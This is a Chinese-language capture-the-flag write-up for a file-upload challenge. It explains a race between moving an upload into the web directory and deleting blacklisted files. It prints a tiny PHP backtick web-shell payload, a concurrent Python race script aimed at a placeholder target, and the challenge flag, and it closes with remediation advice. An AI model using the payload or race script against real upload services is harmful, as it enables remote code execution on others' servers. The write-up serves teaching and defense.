# Tiny File Hosting

## 题目简述

WelcomeCTF2021 的 Tiny File Hosting 只允许上传不超过 9 字节的文件，并禁止 PHP 等危险扩展。漏洞在于程序先把文件移动到 Web 目录，再检查扩展名并删除；上传到删除之间的短暂窗口内，黑名单文件已经可以被 Web 服务器执行。

## 解题过程

`upload.php` 的顺序为：

```php
move_uploaded_file($temp_file, $upload_file);

if (!in_array($file_ext, $disallowed_exts)) {
    rename($upload_file, $safe_name);
} else {
    unlink($upload_file);
}
```

PHP 的 `<?=` 等价于 `<?php echo`，反引号会执行 shell 命令。以下内容只有 8 字节，满足大小限制：

```php
<?=`ls`;
```

以固定名称 `race.php` 反复上传，同时并发访问 `/upload/race.php`。一个简化的竞态脚本为：

```python
from concurrent.futures import ThreadPoolExecutor
import requests

base = "http://target"

def upload(_):
    requests.post(
        base + "/upload.php",
        files={"upload_file": ("race.php", b"<?=`ls`;", "image/png")},
        data={"submit": "1"},
        timeout=2,
    )

def visit(_):
    response = requests.get(base + "/upload/race.php", timeout=2)
    if response.status_code == 200 and response.text.strip():
        print(response.text)

with ThreadPoolExecutor(max_workers=40) as pool:
    for i in range(10000):
        pool.submit(upload, i)
        pool.submit(visit, i)
```

命中窗口时，`ls` 会列出上传目录中的随机文件名。容器的定时任务把 flag 写为 `<17 位随机串>_flag.txt`，该文本文件本来就位于公开的 `/upload/` 目录。取得名称后直接访问对应 URL，得到：

```text
greyhats{h0vv_d1d_y0u_byp455_17?!?!}
```

## 方法总结

检查上传文件的扩展名、大小和内容必须发生在文件进入 Web 可执行目录之前。更安全的设计是在不可公开、不可执行的临时目录完成验证，再以随机名称原子移动；同时服务器应禁止上传目录执行脚本。黑名单本身无法修复 TOCTOU 顺序错误。
